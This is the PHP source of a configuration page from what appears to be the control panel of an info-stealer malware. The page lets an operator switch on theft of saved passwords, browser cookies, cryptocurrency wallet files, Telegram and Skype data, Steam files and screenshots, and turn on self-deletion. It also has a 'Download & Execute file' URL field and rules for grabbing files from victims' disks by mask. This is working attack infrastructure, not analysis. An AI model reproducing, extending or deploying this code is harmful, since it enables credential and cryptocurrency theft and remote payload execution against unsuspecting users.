<?php if(!defined("ACCESS")){exit();} ?>
	<h2>Stealer config</h2>
	<form action='' method='post'>
	<input type='hidden' name='botconfig' value='1337'>
	<input type='checkbox' name='conf_passwords' value='on' <?php if($config['isSavedPasswords']==1){echo "checked";}?>>Passwords<br>
	<input type='checkbox' name='conf_cookies' value='on' <?php if($config['isBrowserData']==1){echo "checked";}?>>Cookies and autocomplete<br>
	<input type='checkbox' name='conf_crypto' value='on' <?php if($config['isWallets']==1){echo "checked";}?>>Cryptocurrency files<br>
	<input type='checkbox' name='conf_skype' value='on' <?php if($config['isSkype']==1){echo "checked";}?>>Skype history file<br>
	<input type='checkbox' name='conf_telegram' value='on' <?php if($config['isTelegram']==1){echo "checked";}?>>Telegram session file<br>
	<input type='checkbox' name='conf_steam' value='on' <?php if($config['isSteam']==1){echo "checked";}?>>Steam files<br>
	<input type='checkbox' name='conf_screenshot' value='on' <?php if($config['isScreenshot']==1){echo "checked";}?>>Screenshot<br>
	<input type='checkbox' name='conf_selfdelete' value='on' <?php if($config['isDelete']==1){echo "checked";}?>>Self-delete<br>
	<!--<input type='checkbox' name='' value='on' <?php if($config['isDouble']==1){echo "checked";}?>>Repeat reports<br>-->
	Download & Execute file:<br>
	<input type='text' size='50' name='conf_loadlink' value='<?php if(!empty($config['DAE'])){echo htmlspecialchars($config['DAE'],ENT_QUOTES);}?>' placeholder='http://1.2.3.4/file.exe'><br>
	<input type="submit" value="Save!">
	</form>



	<div style="padding:15px"><i class="fas fa-filter"></i> Add filegrabber rule <span onclick="viewdiv('add_link');return false;" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>
	<?php
 if(!empty($_SESSION['error'])){ echo "<br><br><span style='font-weight:bold;color:red;'>"; echo htmlspecialchars($_SESSION['error'],ENT_QUOTES); echo "</span>"; echo "<div style=\"padding:15px;\" id=\"add_link\">"; } else{ ?>
	<div style="display:none; padding:15px;" id="add_link">
	<?php
 } ?>
	<form method="post" action="">
	<input type='hidden' name='filegraberconfig' value='1337'>
	<table>
	<tr>
	<td>Name</td>
	<td><input type="text" size="45" name="filegrab_name" placeholder="Grab some files" autocomplete="off"></td>
	</tr>
	<tr>
	<td>Path</td>
	<td><input type="text" size="45" name="filegrab_path" placeholder="c:\" autocomplete="off"></td>
	</tr>
	<tr>
	<td>Mask</td>
	<td><input type="text" size="45" name="filegrab_mask" placeholder="*.txt, *.doc*, *.zip, *.conf" autocomplete="off"></td>
	</tr>
	<tr>
	<td>Max size</td>
	<td><input type="text" size="45" name="filegrab_maxsize" placeholder="5000" autocomplete="off"></td>
	</tr>
	<tr>
	<td>Subfolders processing</td>
	<td><input type="checkbox" size="45" name="filegrab_subfolders" value='on' placeholder="Type" autocomplete="off"></td>
	</tr>
	<tr>
	<td>Shortcuts processing</td>
	<td><input type="checkbox" size="45" name="filegrab_shortcuts" value='on' autocomplete="off"></td>
	</tr>
	<tr>
	<td>Exceptions</td>
	<td><input type="text" size="45" name="filegrab_exceptions" placeholder="Type" autocomplete="off"></td>
	</tr>
	<tr>
	<td></td>
	<td><input type="submit" value="Create"></td>
	</tr>
	</table>
	</form>
	</div>
	</div>
	<?php
 $i=1; if(is_array($filegrabber)){ echo "	<table class='main_table'>
	<tr>
		<td>#</td>
		<td>Name</td>
		<td>Description</td>
		<td>Actions</td>
	</tr>"; foreach($filegrabber as $key=>$filegrabber_str){ echo "<tr>"; echo "<td width='5%' style='vertical-align:top;'>".$i."</td>"; echo "<td width='20%' style='text-align:left;vertical-align:top;'><span style='font-size:20px;font-weight:bold;'>".htmlspecialchars($filegrabber_str['fgName'],ENT_QUOTES)."</span></td>"; $subfolders = ''; $shortcuts = ''; if($filegrabber_str['fgSubfolders']==1){ $subfolders = 'checked'; $subfolders2 = '[ true ]'; }else{ $subfolders2 = '[ false ]'; } if($filegrabber_str['fgShortcuts']==1){ $shortcuts = 'checked'; $shortcuts2 = '[ true ]'; }else{ $shortcuts2 = '[ false ]'; } echo "<td width='60%' style='text-align:left;vertical-align:top;'>
		<div id='info".(int)$i."' style='display:block;'>
		<b>Path:</b> ".htmlspecialchars($filegrabber_str['fgPath'],ENT_QUOTES)."<br>
		<b>Masks:</b> ".htmlspecialchars(implode(", ", explode(",",$filegrabber_str['fgMask'])),ENT_QUOTES)."<br>
		<b>Max Size:</b> ".htmlspecialchars($filegrabber_str['fgMaxsize'],ENT_QUOTES)."<br>
		<b>Subfolders:</b> ".htmlspecialchars($subfolders2,ENT_QUOTES)."<br>
		<b>Shortcuts:</b> ".htmlspecialchars($shortcuts2,ENT_QUOTES)."<br>
		<b>Exceptions:</b> ".htmlspecialchars($filegrabber_str['fgExceptions'],ENT_QUOTES)."<br>
		</div>
		
		<div id='edit".(int)$i."' style='display:none;'>
		<form method=\"post\" action=\"\">
		<input type='hidden' name='filegraberconfigedit' value='1337'>
		<input type='hidden' name='key' value='".htmlspecialchars($key,ENT_QUOTES)."'>
		<table>
		<tr>
		<td>Name</td>
		<td><input type=\"text\" size=\"45\" name=\"filegrab_name\" placeholder=\"Grab some files\" value='".htmlspecialchars($filegrabber_str['fgName'],ENT_QUOTES)."'autocomplete=\"off\"></td>
		</tr>
		<tr>
		<td>Path</td>
		<td><input type=\"text\" size=\"45\" name=\"filegrab_path\" placeholder=\"c:\\\" autocomplete=\"off\" value='".htmlspecialchars($filegrabber_str['fgPath'],ENT_QUOTES)."'></td>
		</tr>
		<tr>
		<td>Mask</td>
		<td><input type=\"text\" size=\"45\" name=\"filegrab_mask\" placeholder=\"*.txt, *.doc*, *.zip, *.conf\" autocomplete=\"off\" value='".htmlspecialchars($filegrabber_str['fgMask'],ENT_QUOTES)."'></td>
		</tr>
		<tr>
		<td>Max size</td>
		<td><input type=\"text\" size=\"45\" name=\"filegrab_maxsize\" placeholder=\"5000\" autocomplete=\"off\" value='".htmlspecialchars($filegrabber_str['fgMaxsize'],ENT_QUOTES)."'></td>
		</tr>
		<tr>
		<td>Subfolders processing</td>
		<td><input type=\"checkbox\" size=\"45\" name=\"filegrab_subfolders\" placeholder=\"Type\" autocomplete=\"off\"  value='on' ".$subfolders."></td>
		</tr>
		<tr>
		<td>Shortcuts processing</td>
		<td><input type=\"checkbox\" size=\"45\" name=\"filegrab_shortcuts\" value='on' placeholder=\"Type\" autocomplete=\"off\" ".$shortcuts."></td>
		</tr>
		<tr>
		<td>Exceptions</td>
		<td><input type=\"text\" size=\"45\" name=\"filegrab_exceptions\" placeholder=\"Type\" autocomplete=\"off\" value='".htmlspecialchars($filegrabber_str['fgExceptions'],ENT_QUOTES)."'></td>
		</tr>
		</table>
		<input type=\"submit\" value=\"Edit\"></td>
		</form>
		</div>	
		</td>"; echo "<td><a href=\"#\" class='tooltip tooltip-left' data-tooltip=\"Edit links\" onclick=\"viewdiv('edit".(int)$i."');viewdiv('info".(int)$i."');return false;\"><i class=\"button button-default fas fa-edit fa-fw\"></i></a> <a href=\"".htmlspecialchars($_SERVER['SCRIPT_NAME'],ENT_QUOTES)."?p=config&action=delete&id=".htmlspecialchars($key,ENT_QUOTES)."\"  class='tooltip tooltip-left' data-tooltip=\"Delete filegrabber rule\"><i class=\"button button-delete fas fa-trash-alt fa-fw\"></i></a></td>"; echo "</tr>"; $i++; } } ?>
	</table>